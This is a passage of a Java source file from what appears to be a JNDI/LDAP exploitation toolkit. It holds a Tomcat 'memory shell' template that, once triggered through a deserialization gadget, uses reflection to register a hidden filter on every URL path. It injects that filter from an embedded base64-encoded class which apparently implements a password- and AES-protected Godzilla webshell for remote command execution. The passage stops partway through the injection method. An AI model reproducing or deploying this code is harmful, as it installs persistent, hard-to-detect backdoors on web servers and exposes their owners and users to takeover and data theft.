package com.feihong.ldap.template;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.webresources.StandardRoot;
import sun.misc.BASE64Decoder;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

public class TomcatMemshellTemplate1 extends AbstractTranslet {

    //参考
    //https://mp.weixin.qq.com/s/nPAje2-cqdeSzNj4kD2Zgw
    //https://zhuanlan.zhihu.com/p/114625962

    public TomcatMemshellTemplate1(){
        try{
            String filterName = "TomcatDynamicFilter-1";
            String urlPattern = "/*";

            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();
            StandardContext standardContext = (StandardContext) standardroot.getContext();

            Field field = standardContext.getClass().getDeclaredField("filterConfigs");
            field.setAccessible(true);
            HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);

            if(map.get(filterName) == null) {
                System.out.println("[+] Add Dynamic Filter");

                //生成 FilterDef
                //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                Class filterDefClass = null;
                try {
                    filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                } catch (ClassNotFoundException e) {
                    filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                }

                Object filterDef = filterDefClass.newInstance();
                filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, filterName);

                ClassLoader cl = Thread.currentThread().getContextClassLoader();
                Class clazz;
                try{
                    clazz = cl.loadClass("com.feihong.ldap.template.DynamicFilterTemplate");
                }catch(ClassNotFoundException e){
                    BASE64Decoder base64Decoder = new BASE64Decoder();
                    String codeClass = "yv66vgAAADQCAAoAhgETCQB2ARQJAHYBFQgBFgkAdgEXCAEYCQB2ARkKAIYBGgoAhgEbCAEcCgEdAR4HAR8KACcBIAoADAEhCgEdASIKAR0BIwcBJAgBJQoBJgEnCgAnASgKASYBKQcBKgoBJgErCgAWASwKABYBLQoAJwEuCAEvCgAkATAIATEHATIKACQBMwcAywoBNAE1CgAmATYIATcHATgHAJ8HATkHAToIATsKACQBPAgBPQgBPggBPwgBQAgBQQoAdgFCCAFDCwBMAUQJAHYBRQgAkAkAdgFGBwFHCgA1ARMKADUBSAoANQFJCgB2AUoJAHYBSwcBTAoAOwETCAFNCAFOCAFPCwBNAVALAEwBUQsATQFRCgB2AVIKADsBUwgBVAoANQFVCwBNAVYKAVcBWAoBVwFZCgFXAVoKACQBWwcBXAcBXQgBXggBXwoAJAFgCAFhCACICgAkAWIKAWMBZAoBYwFlCACKCwBMAWYLAWcBaAgBaQcBagcBawcBbAgBbQkBbgFvCgFjAXALAWcBcQkBcgFzCgF0AXULAOMBdggBdwoBNAFkCQFuAXgIAXkIAXoIANoIAXsKACcBfAoBfQF+CAF/CgARAYAIAYELAEwBggsBgwGECgB2AYUKAHYBhggBhwsBiAGJBwGKCgAkAYsKAHYBGgoAdgGMCwGIAY0IAY4LAEwBjQcBjwoAfQETCgAmAZAKACcBkQoBVwGSCgAmAUkKAH0BkwoAdgGUCgAnAZUHAZYHAZcBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQACY3MBABJMamF2YS9sYW5nL1N0cmluZzsBAAJ4YwEAA1B3ZAEABHBhdGgBAANtZDUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExHb2R6aWxsYUZpbHRlcjsBABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAAXoBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAAVEBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAJjYgEAAltCAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAXMBAAFtAQABWgEADVN0YWNrTWFwVGFibGUHAYoHAZgHASQBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAHUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQADcmV0BwE6AQAMYmFzZTY0RW5jb2RlAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEABmJhc2U2NAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAHRW5jb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABHZhcjYBAAJicwEABXZhbHVlAQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAANvYmoBAAZvdXRwdXQBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAV0YWdfcwEABXRhZ19lBwE5BwFMAQAIcGFyc2VPYmoBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBAARkYXRhAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEABWNsYXp6AQADcmVxAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEACHJlcXVlc3QyAQAEcmVzcAEAAmUxAQAJYWRkRmlsdGVyAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlmaWx0ZXJNYXABAAV2YXIyMwEABG5hbWUBAAxmaWx0ZXJNYXBPYmoBABFmaWx0ZXJTdGFydE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZmluZEZpbHRlck1hcHMBAApmaWx0ZXJNYXBzAQANdG1wRmlsdGVyTWFwcwEABWluZGV4AQABSQEADGNvbnRleHRGaWVsZAEAEmFwcGxpY2F0aW9uQ29udGV4dAEALUxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25Db250ZXh0OwEAEmZpbHRlclJlZ2lzdHJhdGlvbgcBmgEAB0R5bmFtaWMBAAxJbm5lckNsYXNzZXMBACpMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24kRHluYW1pYzsBAAV2YXIxMQEAD3N0YW5kYXJkQ29udGV4dAEAKkxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0OwEACnN0YXRlRmllbGQBAA5zZXJ2bGV0Q29udGV4dAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0OwEABmZpbHRlcgEAFkxqYXZheC9zZXJ2bGV0L0ZpbHRlcjsBAApmaWx0ZXJOYW1lAQADdXJsBwGbBwGXBwGcBwFqBwFrBwGaBwGdBwE4BwGeAQAKRXhjZXB0aW9ucwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwGfBwGgBwGhBwFcBwFdBwGiAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABNHb2R6aWxsYUZpbHRlci5qYXZhDACSAJMMAIgAiQwAigCLAQAFVVRGLTgMAIwAjQEAEDNjNmUwYjhhOWMxNTIyNGEMAI4AjQwAkgCZDAGjAaQBAANBRVMHAZgMAaUBpgEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAacBqAwAkgGpDAD7AaoMAasBrAEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHAa0MAaUBrgwBrwGwDAGxAbIBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBswGoDACSAbQMAbUBtgwBtwDTAQAQamF2YS51dGlsLkJhc2U2NAwBuAG5AQAKZ2V0RW5jb2RlcgEAEltMamF2YS9sYW5nL0NsYXNzOwwBugG7BwGdDAG8Ab0MAb4BvwEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAHAAcEBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwAyADJAQAEcGFzcwwBwgCtDACPAI0MAJAAjQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAHDAcQMAbUA0wwAkQCtDACRAI0BABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQADLT58AQADfDwtAQAJdGV4dC9odG1sDAHFAcYMAccBxgwA0gDTDAHDAcgBAAZlcnJvcjoMAcMByQwBygHLBwHMDAHNAcYMAc4AkwwBzwCTDAHQAdEBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAB1qYXZheC5zZXJ2bGV0LmpzcC5QYWdlQ29udGV4dAEACmdldFJlcXVlc3QMAdIBuwEAC2dldFJlc3BvbnNlDAHTAdQHAZwMAdUB1gwB1wHYDAHZAdoHAZsMAdsB3AEAB2NvbnRleHQBACtvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25Db250ZXh0AQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dAEAJm9yZy9hcGFjaGUvY2F0YWxpbmEvdXRpbC9MaWZlY3ljbGVCYXNlAQAFc3RhdGUHAd0MAd4B3wwB4AHhDADSAeIHAeMMAeQB5QcB5gwB5wHoDAHpAeoBAAtmaWx0ZXJTdGFydAwB6wHfAQAvb3JnLmFwYWNoZS50b21jYXQudXRpbC5kZXNjcmlwdG9yLndlYi5GaWx0ZXJNYXABACRvcmcuYXBhY2hlLmNhdGFsaW5hLmRlcGxveS5GaWx0ZXJNYXABAA1nZXRGaWx0ZXJOYW1lDAHsAe0HAe4MAe8B8AEAB1N1Y2Nlc3MMAfEA0wEAFUZpbHRlciBhbHJlYWR5IGV4aXN0cwwB8gHzBwGfDAH0AK0MALwAvQwAoAChAQAHcGF5bG9hZAcBogwB9QH2AQAOR29kemlsbGFGaWx0ZXIMAfcB+AwAnACdDAH5AfoBAApwYXJhbWV0ZXJzAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAL8AwAwB+wH8DAH9AcYMAf4BqAwAsQCyDAH7AbYBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAE2phdmF4L2NyeXB0by9DaXBoZXIHAf8BAChqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbiREeW5hbWljAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQATamF2YS9sYW5nL1Rocm93YWJsZQEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7AQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBAAh0b1N0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldEhlYWRlcgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADnNldENvbnRlbnRUeXBlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEALShMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXByaW50AQAFZmx1c2gBAAVjbG9zZQEAB2lzQXJyYXkBAAMoKVoBABFnZXREZWNsYXJlZE1ldGhvZAEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0U2VydmxldENvbnRleHQBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0OwEAFWdldEZpbHRlclJlZ2lzdHJhdGlvbgEANihMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L3NlcnZsZXQvRmlsdGVyUmVnaXN0cmF0aW9uOwEAIm9yZy9hcGFjaGUvY2F0YWxpbmEvTGlmZWN5Y2xlU3RhdGUBAA1TVEFSVElOR19QUkVQAQAkTG9yZy9hcGFjaGUvY2F0YWxpbmEvTGlmZWN5Y2xlU3RhdGU7AQADc2V0AQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylWAQBUKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZheC9zZXJ2bGV0L0ZpbHRlcjspTGphdmF4L3NlcnZsZXQvRmlsdGVyUmVnaXN0cmF0aW9uJER5bmFtaWM7AQAcamF2YXgvc2VydmxldC9EaXNwYXRjaGVyVHlwZQEAB1JFUVVFU1QBAB5MamF2YXgvc2VydmxldC9EaXNwYXRjaGVyVHlwZTsBABFqYXZhL3V0aWwvRW51bVNldAEAAm9mAQAlKExqYXZhL2xhbmcvRW51bTspTGphdmEvdXRpbC9FbnVtU2V0OwEAGGFkZE1hcHBpbmdGb3JVcmxQYXR0ZXJucwEAKihMamF2YS91dGlsL0VudW1TZXQ7WltMamF2YS9sYW5nL1N0cmluZzspVgEAB1NUQVJURUQBABBlcXVhbHNJZ25vcmVDYXNlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAQamF2YS9sYW5nL1N5c3RlbQEACWFycmF5Y29weQEAKihMamF2YS9sYW5nL09iamVjdDtJTGphdmEvbGFuZy9PYmplY3Q7SUkpVgEACmdldE1lc3NhZ2UBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEADGdldFBhcmFtZXRlcgEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAMc2V0QXR0cmlidXRlAQAnKExq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";
                    byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                    Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    method.setAccessible(true);
                    clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
                }

                filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, clazz.getName());
                filterDef.getClass().getDeclaredMethod("setFilter", Filter.class).invoke(filterDef, clazz.newInstance());
                standardContext.getClass().getDeclaredMethod("addFilterDef", filterDefClass).invoke(standardContext, filterDef);
